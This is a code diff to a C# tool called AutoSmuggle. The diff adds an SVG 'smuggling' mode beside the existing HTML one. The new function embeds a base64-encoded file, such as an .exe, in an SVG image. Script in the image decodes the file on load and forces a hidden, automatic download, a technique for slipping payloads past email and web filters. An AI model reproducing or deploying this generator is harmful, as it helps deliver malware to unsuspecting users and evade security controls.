@@ -14,8 +14,44 @@ namespace AutoSmuggle
             String b64data = Convert.ToBase64String(plainText);
             return b64data;
         }
-        public static string HTMLSmuggle(string b64string,string filename)
+
+        public static string SVGSmuggle(string b64string, string filename)
         {
+            string svgbody = @"<svg xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"" version=""1.0"" width=""100"" height=""100"">
+    <circle cx=""50"" cy=""50"" r=""40"" stroke=""black"" stroke-width=""3"" fill=""red""/>
+    <script type=""application/ecmascript""><![CDATA[
+        document.addEventListener(""DOMContentLoaded"", function() {
+            function base64ToArrayBuffer(base64) {
+                var binary_string = window.atob(base64);
+                var len = binary_string.length;
+                var bytes = new Uint8Array(len);
+                for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
+                return bytes.buffer;
+            }" + "\n" +
+            "var file = '" + b64string + "';\n" +
+            "var data = base64ToArrayBuffer(file);\n" +
+            "var blob = new Blob([data], {type: 'octet/stream'});\n" +
+            "var fileName = '" + filename + "';\n" +
+            "var a = document.createElementNS('http://www.w3.org/1999/xhtml', 'a');\n" +
+            "document.documentElement.appendChild(a);\n" +
+            "a.setAttribute('style', 'display: none');\n" +
+            "var url = window.URL.createObjectURL(blob);\n" +
+            "a.href = url;\n" +
+            "a.download = fileName;\n" +
+            "a.click();\n" +
+            "window.URL.revokeObjectURL(url);\n" +
+        "});\n" +
+    "]]></script>\n" +
+"</svg>";
+            string file = filename;
+            var file2 = file.Split('.')[0];
+            var file3 = file.Split('.')[1];
+            System.IO.File.WriteAllText("smuggle-" + file2 + ".svg", svgbody);
+            return null;
+        }
+        public static string HTMLSmuggle(string b64string, string filename)
+        {
+            
             string htmlbody2 =
                 "<html>\n" +
                 "    <body>\n" +
@@ -66,6 +102,8 @@ namespace AutoSmuggle
             System.IO.File.WriteAllText("smuggle-"+file2+".html", htmlbody2);
             return null;
         }
+
+
         public static void PrintError(string error)
         {
             Console.ForegroundColor = ConsoleColor.Red;
@@ -87,23 +125,37 @@ namespace AutoSmuggle
                         arguments[argument] = string.Empty;
                 }
 
-                if (arguments.Count < 2)
+                if (arguments.Count < 3)
                 {
-                    PrintError("[-] No arguments specified. Autosmuggle <path of file to smuggle> <output of file>.");
+                    PrintError("[-] No arguments specified. Autosmuggle C:\\Path\\To\\File\\abc.exe abc.exe <svg/html>.");
                 }
 
-                else if (arguments.Count == 2)
+                else if (arguments.Count == 3)
                 {
-                    // byte[] binarypath = new byte[] { };
+                    // byte[] binarypath = new byte[] { };  
                     string binarypath = args[0];
                     Console.WriteLine("[+] Reading Data");
                     byte[] streamdata = System.IO.File.ReadAllBytes(binarypath);
                     string b64data = Base64Encode(streamdata);
                     Console.WriteLine("[+] Converting to Base64");
                     string file = args[1];
-                    Console.WriteLine("[*] Smuggling in HTML");
-                    HTMLSmuggle(b64data,file);
-                    Console.WriteLine("[+] File Written to Current Directory...");
+                    string input = args[2];
+                    if (input == "html")
+                    {
+                        Console.WriteLine("[*] Smuggling in HTML");
+                        HTMLSmuggle(b64data, file);
+                        Console.WriteLine("[+] File Written to Current Directory...");
+                    }
+
+                    if (input == "svg")
+                    {
+                        Console.WriteLine("[*] Smuggling in SVG");
+                        SVGSmuggle(b64data, file);
+                        Console.WriteLine("[+] File Written to Current Directory...");
+
+                    }
+
+                    
 
 
                 }
